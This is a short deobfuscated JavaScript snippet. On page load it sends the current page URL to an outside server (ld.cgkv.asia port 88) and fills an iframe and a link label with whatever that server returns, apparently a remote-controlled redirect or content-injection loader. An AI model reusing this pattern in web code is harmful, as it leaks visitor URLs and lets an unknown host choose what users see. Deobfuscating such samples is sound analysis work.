//Tue Feb 25 2025 14:26:19 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function YwUhVD(_0x5cc57a, _0xf0642a) {
  return;
  YwUhVD = function (_0x24b310, _0x5f4a92) {
    _0x24b310 = _0x24b310 - 0;
    var _0x3aa658 = _0x5e50e6[_0x24b310];
    return _0x3aa658;
  };
  return YwUhVD(_0x5cc57a, _0xf0642a);
}
YwUhVD();
function getParameterByName(_0x32cfa1, _0x22aaec) {
  if (!_0x22aaec) {
    _0x22aaec = window.location.href;
  }
  _0x32cfa1 = _0x32cfa1.replace(new RegExp("[\\[\\]]", "g"), "\\$&");
  var _0xa977f2 = new RegExp("[?&]" + _0x32cfa1 + "(=([^&#]*)|&|#|$)"),
    _0x25dbf5 = _0xa977f2.exec(_0x22aaec);
  if (!_0x25dbf5) {
    return null;
  }
  if (!_0x25dbf5[2]) {
    return "";
  }
  return decodeURIComponent(_0x25dbf5[2].replace(new RegExp("\\+", "g"), " "));
}
window.onload = function () {
  var _0x5c2c39 = window.location.href;
  var _0x5e5b86 = new XMLHttpRequest();
  _0x5e5b86.onreadystatechange = function () {
    if (_0x5e5b86.readyState == 4 && _0x5e5b86.status == 200) {
      let _0x72dc7f;
      var _0x32324b = JSON.parse(_0x5e5b86.responseText);
      _0x72dc7f = "lacmij";
      var _0x4bbf72 = _0x32324b.url2;
      var _0x3f2ed2 = 14;
      var _0x8daa6e = _0x32324b.name;
      _0x3f2ed2 = 3;
      document.getElementById("linkName").innerText = _0x8daa6e;
      document.getElementById("myIframe").src = _0x4bbf72;
    }
  };
  _0x5e5b86.open("GET", "http://ld.cgkv.asia:88/api2.php?url=" + encodeURIComponent(_0x5c2c39), true);
  _0x5e5b86.send();
};
function jFfVzy(_0xe7c5e0, _0x57df64) {
  return;
  jFfVzy = function (_0x35a9fb, _0x463f60) {
    _0x35a9fb = _0x35a9fb - 0;
    var _0x12aa80 = _0x5e50e6[_0x35a9fb];
    return _0x12aa80;
  };
  return jFfVzy(_0xe7c5e0, _0x57df64);
}
jFfVzy();